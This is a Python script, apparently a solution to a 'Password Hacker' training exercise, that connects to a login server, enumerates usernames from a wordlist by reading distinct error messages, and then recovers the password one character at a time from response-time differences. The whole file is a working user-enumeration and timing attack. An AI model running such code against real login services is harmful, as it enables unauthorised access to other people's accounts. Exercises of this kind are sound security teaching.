import sys
import socket
import itertools
import json
import string
import datetime

#  def get_passw_iter(passw_str):
#    return itertools.product(*(ch if ch.isdigit() else ch + ch.upper() for ch in passw_str))



# class PasswFound( Exception ):
#    pass


login_file_path = r"c:\Users\Dmitriy\PycharmProjects\Password Hacker1\Password Hacker\task\hacking\logins.txt"

valid_passw_symbols = string.ascii_letters + string.digits


def login_password_to_json(login, password):
    """
    Converts pair login password in to json format
    :param login: string login
    :param password: string password
    :return: json string
    """
    login_passw_dict = {"login":login, "password":password}
    return json.dumps(login_passw_dict, indent = 4)


def dict_from_json_string(json_respond):
    return json.loads(json_respond)

def find_login(client_sock):
    """
    find login for connecting to server. This func use vulnerability: server respond consist description
    failure(wrong password or wrong login)

    if success return login else return None
    """
    with open(login_file_path, "r") as login_file:
        for login in login_file:
            login = login.replace("\n", "")
            log_passw_json = login_password_to_json(login, "")  # login with empty password
            client_sock.send(log_passw_json.encode(encoding="utf-8"))
            respond = json.loads(client_sock.recv(1024).decode(encoding="utf-8"))
            if respond["result"] != "Wrong login!":
                return login
    return None


def find_password(client_sock, login):
    """
    :param client_sock:
    :return:
    """
    passw = ""
    while True:
        find_sym = False
        for ch in valid_passw_symbols:
            log_passw_json = login_password_to_json(login, passw + ch)
            start = datetime.datetime.now()
            client_sock.send(log_passw_json.encode(encoding="utf-8"))
            respond = json.loads(client_sock.recv(1024).decode(encoding="utf-8"))
            finish = datetime.datetime.now()
            tm_diff = finish - start
            if respond["result"] == "Connection success!":
                return passw + ch
            if tm_diff.microseconds >= 100000:
                passw = passw + ch
                find_sym = True
        if find_sym == False:
            break
    return None


def main():
    if len(sys.argv) == 3:
        ip_addr = sys.argv[1]
        port = int(sys.argv[2])


        with (socket.socket()) as client_socket:
            client_socket.connect((ip_addr, port))
            login = find_login(client_socket)
            if login is not None:
                password = find_password(client_socket, login)
                if password is not None:
                    print(login_password_to_json(login, password))
    else:
        print("Program need 2 command line arguments: 1 - IP address, 2 - port")


if __name__ == "__main__":
    main()
    # test_passw_iter()
